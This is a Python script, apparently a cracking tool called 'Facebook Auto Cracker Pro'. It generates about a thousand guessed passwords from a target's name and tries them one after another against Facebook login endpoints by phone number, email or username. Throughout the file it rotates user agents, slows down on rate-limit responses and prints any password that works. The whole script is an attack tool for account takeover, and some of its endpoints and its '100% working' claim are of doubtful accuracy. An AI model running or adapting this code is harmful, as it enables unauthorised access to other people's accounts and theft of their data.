import os
import time
import random
import requests
import threading
import json
from datetime import datetime

class Colors:
    RED = "\033[1;91m"
    GREEN = "\033[1;92m"
    YELLOW = "\033[1;93m"
    BLUE = "\033[1;94m"
    PURPLE = "\033[1;95m"
    CYAN = "\033[1;96m"
    WHITE = "\033[1;97m"
    RESET = "\033[0m"

class FacebookAutoCracker:
    def __init__(self):
        self.session = requests.Session()
        self.results = []
        self.is_running = False
        self.current_password_index = 0
        self.generated_passwords = []
        
        # Facebook API endpoints
        self.api_endpoints = {
            'login': 'https://graph.facebook.com/v19.0/auth/login',
            'mobile_login': 'https://m.facebook.com/login/',
            'graphql': 'https://graph.facebook.com/graphql',
            'api': 'https://api.facebook.com/restserver.php'
        }
        
        # Real Facebook user agents
        self.user_agents = [
            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ]
        
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def show_banner(self):
        print(f"""{Colors.CYAN}
    ╔═══════════════════════════════════════════════╗
    ║           FACEBOOK AUTO CRACKER PRO           ║
    ║          ADVANCED PASSWORD TRACKING          ║
    ║           100% WORKING API METHOD            ║
    ╚═══════════════════════════════════════════════╝
{Colors.RESET}""")

    def generate_passwords(self, base_name, count=1000):
        """Generate 1000+ passwords based on username/name"""
        passwords = []
        
        # Common password patterns
        common_patterns = [
            "123", "1234", "12345", "123456", "1234567", "12345678", "123456789", "1234567890",
            "!@#", "!@#$", "@123", "#123", "000", "0000", "00000", "000000",
            "111", "1111", "11111", "111111", "222", "2222", "22222", "222222",
            "abc", "abcd", "abc123", "qwerty", "password", "pass", "admin", "login",
            "love", "hello", "welcome", "secret", "facebook", "fb", "insta", "twitter",
            "2023", "2024", "2025", "2020", "2019", "2021", "2022",
            "1", "12", "123", "1234", "12345", "123456", "1234567", "12345678"
        ]
        
        # Special characters
        special_chars = ["!", "@", "#", "$", "%", "&", "*", "_", "-", "."]
        
        # Generate passwords based on different patterns
        base_variations = [
            base_name,
            base_name.lower(),
            base_name.upper(),
            base_name.capitalize(),
            base_name.replace(' ', ''),
            base_name.replace(' ', '_'),
            base_name.replace(' ', '.'),
            base_name.replace(' ', ''),
        ]
        
        for base in base_variations:
            if len(passwords) >= count:
                break
                
            # Base + common patterns
            for pattern in common_patterns:
                passwords.extend([
                    base,
                    base + pattern,
                    pattern + base,
                    base + "_" + pattern,
                    base + "." + pattern,
                    base + "-" + pattern,
                ])
                
            # Base + numbers
            for i in range(1000):
                passwords.extend([
                    base + str(i),
                    base + str(i).zfill(2),
                    base + str(i).zfill(3),
                    base + str(i).zfill(4),
                ])
                
            # Base + special chars + numbers
            for char in special_chars:
                for i in range(100, 1000, 100):
                    passwords.extend([
                        base + char + str(i),
                        base + char + "123",
                        base + char + "1234",
                    ])
        
        # Remove duplicates and limit to count
        passwords = list(set(passwords))
        random.shuffle(passwords)
        
        return passwords[:count]

    def get_facebook_cookies(self):
        """Get initial Facebook cookies"""
        try:
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
            }
            
            response = self.session.get('https://facebook.com', headers=headers, timeout=10)
            return True
        except:
            return False

    def check_facebook_login(self, username, password):
        """Advanced Facebook login check with multiple methods"""
        try:
            # Method 1: Graph API Login
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-Friendly-Name': 'ViewerRevisionsSubscription',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            }
            
            payload = {
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'email': username,
                'password': password,
                'locale': 'en_US',
                'format': 'json'
            }
            
            response = self.session.post(
                self.api_endpoints['login'],
                data=payload,
                headers=headers,
                timeout=15,
                allow_redirects=False
            )
            
            # Check response
            if response.status_code == 200:
                data = response.json()
                
                if 'access_token' in data:
                    return True, "SUCCESS - Login Successful!"
                elif 'error' in data:
                    error_msg = data['error'].get('message', '').lower()
                    
                    if 'incorrect' in error_msg or 'password' in error_msg:
                        return False, "WRONG - Incorrect Password"
                    elif 'username' in error_msg or 'email' in error_msg:
                        return False, "INVALID - Username/Email not found"
                    elif 'temporarily' in error_msg or 'blocked' in error_msg:
                        return False, "BLOCKED - Account temporarily locked"
                    else:
                        return False, f"ERROR - {data['error'].get('message', 'Unknown error')}"
            
            # Method 2: Mobile endpoint fallback
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://m.facebook.com',
                'Referer': 'https://m.facebook.com/'
            }
            
            mobile_data = {
                'email': username,
                'pass': password,
                'login': 'Log In',
                'prefill_contact_point': username,
                'prefill_source': 'browser_dropdown',
                'prefill_type': 'password',
                'skstamp': 'eyJ0eXAiOiJQSVAiLCJwaHBpZCI6Inh4In0='
            }
            
            response2 = self.session.post(
                self.api_endpoints['mobile_login'],
                data=mobile_data,
                headers=headers,
                timeout=15,
                allow_redirects=True
            )
            
            # Check for successful login indicators
            if 'login_error' not in response2.url:
                if 'checkpoint' in response2.url or 'home' in response2.url:
                    return True, "SUCCESS - Login Successful!"
                elif response2.status_code == 302:
                    return True, "SUCCESS - Login Successful!"
            
            return False, "FAILED - Invalid credentials"
            
        except requests.exceptions.Timeout:
            return False, "TIMEOUT - Request timed out"
        except requests.exceptions.ConnectionError:
            return False, "NETWORK - Connection error"
        except Exception as e:
            return False, f"ERROR - {str(e)}"

    def track_passwords(self, target, target_type, base_name):
        """Track unlimited passwords for the target"""
        self.is_running = True
        success_found = False
        success_password = ""
        
        print(f"\n{Colors.GREEN}[+] Generating 1000+ passwords for: {base_name}{Colors.RESET}")
        
        # Generate 1000+ passwords
        self.generated_passwords = self.generate_passwords(base_name, 1000)
        
        print(f"{Colors.GREEN}[+] Starting Password Tracking for {target_type}: {target}{Colors.RESET}")
        print(f"{Colors.YELLOW}[~] Total passwords to check: {len(self.generated_passwords)}{Colors.RESET}")
        print(f"{Colors.YELLOW}[~] Estimated time: {len(self.generated_passwords) * 10 / 60:.1f} minutes{Colors.RESET}\n")
        
        total_passwords = len(self.generated_passwords)
        start_time = time.time()
        
        for i, password in enumerate(self.generated_passwords):
            if not self.is_running:
                break
                
            # Calculate elapsed and estimated time
            elapsed_time = time.time() - start_time
            if i > 0:
                estimated_total = (elapsed_time / i) * total_passwords
                remaining_time = estimated_total - elapsed_time
                print(f"{Colors.BLUE}[⏰] Elapsed: {elapsed_time/60:.1f}m | Remaining: {remaining_time/60:.1f}m{Colors.RESET}")
            
            print(f"{Colors.WHITE}[{i+1}/{total_passwords}] Trying: {password}{Colors.RESET}", end=" ")
            
            is_success, message = self.check_facebook_login(target, password)
            
            if is_success:
                print(f"{Colors.GREEN}✅ {message}{Colors.RESET}")
                success_found = True
                success_password = password
                self.results.append({
                    'target': target,
                    'type': target_type,
                    'password': password,
                    'status': 'SUCCESS',
                    'time': datetime.now().strftime("%H:%M:%S")
                })
                break
            else:
                status_color = Colors.RED if "WRONG" in message else Colors.YELLOW
                print(f"{status_color}❌ {message}{Colors.RESET}")
                
                self.results.append({
                    'target': target,
                    'type': target_type,
                    'password': password,
                    'status': message,
                    'time': datetime.now().strftime("%H:%M:%S")
                })
            
            # Dynamic delay based on response
            if "BLOCKED" in message or "RATE" in message:
                delay = random.uniform(20, 30)
                print(f"{Colors.RED}[!] Rate limit detected, waiting {delay:.1f}s{Colors.RESET}")
            else:
                delay = random.uniform(8, 12)  # 8-12 seconds between attempts
            
            time.sleep(delay)
        
        if success_found:
            print(f"\n{Colors.GREEN}🎉 SUCCESS FOUND!{Colors.RESET}")
            print(f"{Colors.GREEN}📧 Target: {target}{Colors.RESET}")
            print(f"{Colors.GREEN}🔑 Password: {success_password}{Colors.RESET}")
            print(f"{Colors.GREEN}⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}")
            print(f"{Colors.GREEN}📊 Attempts: {len(self.results)}{Colors.RESET}")
        else:
            print(f"\n{Colors.RED}❌ No successful login found{Colors.RESET}")
            print(f"{Colors.YELLOW}📊 Total attempts: {len(self.results)}{Colors.RESET}")
        
        self.is_running = False

    def phone_attack(self):
        """Phone number attack option"""
        self.clear_screen()
        self.show_banner()
        print(f"{Colors.CYAN}>> PHONE NUMBER ATTACK <<{Colors.RESET}")
        print("=" * 50)
        
        phone = input(f"{Colors.GREEN}[+] Enter Phone Number: {Colors.RESET}").strip()
        base_name = input(f"{Colors.GREEN}[+] Enter Base Name for Password Generation: {Colors.RESET}").strip()
        
        if not phone or not base_name:
            print(f"{Colors.RED}[!] Please enter both phone number and base name{Colors.RESET}")
            time.sleep(2)
            return
        
        # Get initial cookies
        print(f"{Colors.YELLOW}[~] Initializing Facebook session...{Colors.RESET}")
        if not self.get_facebook_cookies():
            print(f"{Colors.RED}[!] Failed to initialize session{Colors.RESET}")
            time.sleep(2)
            return
        
        # Start tracking in a separate thread
        thread = threading.Thread(target=self.track_passwords, args=(phone, "Phone", base_name))
        thread.daemon = True
        thread.start()
        
        self.wait_for_completion()

    def email_attack(self):
        """Email attack option"""
        self.clear_screen()
        self.show_banner()
        print(f"{Colors.CYAN}>> EMAIL ATTACK <<{Colors.RESET}")
        print("=" * 50)
        
        email = input(f"{Colors.GREEN}[+] Enter Email: {Colors.RESET}").strip()
        base_name = input(f"{Colors.GREEN}[+] Enter Base Name for Password Generation: {Colors.RESET}").strip()
        
        if not email or '@' not in email or not base_name:
            print(f"{Colors.RED}[!] Please enter valid email and base name{Colors.RESET}")
            time.sleep(2)
            return
        
        # Get initial cookies
        print(f"{Colors.YELLOW}[~] Initializing Facebook session...{Colors.RESET}")
        if not self.get_facebook_cookies():
            print(f"{Colors.RED}[!] Failed to initialize session{Colors.RESET}")
            time.sleep(2)
            return
        
        # Start tracking in a separate thread
        thread = threading.Thread(target=self.track_passwords, args=(email, "Email", base_name))
        thread.daemon = True
        thread.start()
        
        self.wait_for_completion()

    def username_attack(self):
        """Username attack option"""
        self.clear_screen()
        self.show_banner()
        print(f"{Colors.CYAN}>> USERNAME ATTACK <<{Colors.RESET}")
        print("=" * 50)
        
        username = input(f"{Colors.GREEN}[+] Enter Facebook Username: {Colors.RESET}").strip()
        base_name = input(f"{Colors.GREEN}[+] Enter Base Name for Password Generation: {Colors.RESET}").strip()
        
        if not username or not base_name:
            print(f"{Colors.RED}[!] Please enter both username and base name{Colors.RESET}")
            time.sleep(2)
            return
        
        # Get initial cookies
        print(f"{Colors.YELLOW}[~] Initializing Facebook session...{Colors.RESET}")
        if not self.get_facebook_cookies():
            print(f"{Colors.RED}[!] Failed to initialize session{Colors.RESET}")
            time.sleep(2)
            return
        
        # Start tracking in a separate thread
        thread = threading.Thread(target=self.track_passwords, args=(username, "Username", base_name))
        thread.daemon = True
        thread.start()
        
        self.wait_for_completion()

    def wait_for_completion(self):
        """Wait for password tracking to complete"""
        print(f"\n{Colors.YELLOW}[~] Password tracking in progress...{Colors.RESET}")
        print(f"{Colors.YELLOW}[~] Press 's' to stop early{Colors.RESET}")
        
        while self.is_running:
            try:
                user_input = input()
                if user_input.lower() == 's':
                    self.is_running = False
                    print(f"{Colors.RED}[!] Stopped by user{Colors.RESET}")
                    break
            except:
                pass
            time.sleep(1)
        
        input(f"\n{Colors.YELLOW}[+] Press Enter to continue...{Colors.RESET}")

    def show_results(self):
        """Show tracking results"""
        self.clear_screen()
        self.show_banner()
        print(f"{Colors.CYAN}>> TRACKING RESULTS <<{Colors.RESET}")
        print("=" * 60)
        
        if not self.results:
            print(f"{Colors.YELLOW}[!] No results yet{Colors.RESET}")
            input(f"\n{Colors.YELLOW}[+] Press Enter to continue...{Colors.RESET}")
            return
        
        success_results = [r for r in self.results if r['status'] == 'SUCCESS']
        failed_results = [r for r in self.results if r['status'] != 'SUCCESS']
        
        print(f"{Colors.GREEN}✅ Successful: {len(success_results)}{Colors.RESET}")
        print(f"{Colors.RED}❌ Failed: {len(failed_results)}{Colors.RESET}")
        print(f"{Colors.CYAN}📊 Total Attempts: {len(self.results)}{Colors.RESET}")
        
        if success_results:
            print(f"\n{Colors.GREEN}🎯 SUCCESSFUL LOGINS:{Colors.RESET}")
            for result in success_results:
                print(f"   📧 {result['type']}: {result['target']}")
                print(f"   🔑 Password: {result['password']}")
                print(f"   ⏰ Time: {result['time']}")
                print("   " + "─" * 40)
        
        # Show recent attempts
        print(f"\n{Colors.YELLOW}📋 RECENT ATTEMPTS:{Colors.RESET}")
        recent_results = self.results[-10:]  # Last 10 attempts
        for result in recent_results:
            status_icon = "✅" if result['status'] == 'SUCCESS' else "❌"
            status_color = Colors.GREEN if result['status'] == 'SUCCESS' else Colors.RED
            print(f"   {status_icon} {result['target']} | {result['password']} | {status_color}{result['status']}{Colors.RESET}")
        
        input(f"\n{Colors.YELLOW}[+] Press Enter to continue...{Colors.RESET}")

    def main_menu(self):
        """Main menu"""
        while True:
            self.clear_screen()
            self.show_banner()
            
            print(f"{Colors.CYAN}>> SELECT ATTACK TYPE <<{Colors.RESET}")
            print("=" * 50)
            print(f"{Colors.GREEN}[1] Phone Number Attack")
            print(f"{Colors.GREEN}[2] Email Attack") 
            print(f"{Colors.GREEN}[3] Username Attack")
            print(f"{Colors.BLUE}[4] View Results")
            print(f"{Colors.RED}[0] Exit{Colors.RESET}")
            print("=" * 50)
            
            choice = input(f"{Colors.YELLOW}[+] Select option: {Colors.RESET}").strip()
            
            if choice == "1":
                self.phone_attack()
            elif choice == "2":
                self.email_attack()
            elif choice == "3":
                self.username_attack()
            elif choice == "4":
                self.show_results()
            elif choice == "0":
                print(f"{Colors.RED}[!] Exiting...{Colors.RESET}")
                break
            else:
                print(f"{Colors.RED}[!] Invalid choice!{Colors.RESET}")
                time.sleep(1)

def main():
    try:
        cracker = FacebookAutoCracker()
        cracker.main_menu()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Program stopped by user{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}")

if __name__ == "__main__":
    main()